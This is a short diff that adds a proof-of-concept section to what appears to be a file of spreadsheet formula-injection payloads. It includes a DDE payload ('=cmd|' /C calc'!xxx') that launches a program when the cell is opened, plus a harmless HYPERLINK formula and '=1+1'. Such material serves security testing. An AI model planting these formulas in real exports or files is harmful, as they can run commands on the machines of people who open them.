@@ -1,3 +1,13 @@
+POC 
+
+=1+1
+=HYPERLINK("https://google.com","Click here")
+=cmd|' /C calc'!xxx
+
+
+
+-------------------------------------------------
+Reference
 =cmd|' /C calc'!xxx
 =HYPERLINK('https://google.com','Click here')
 
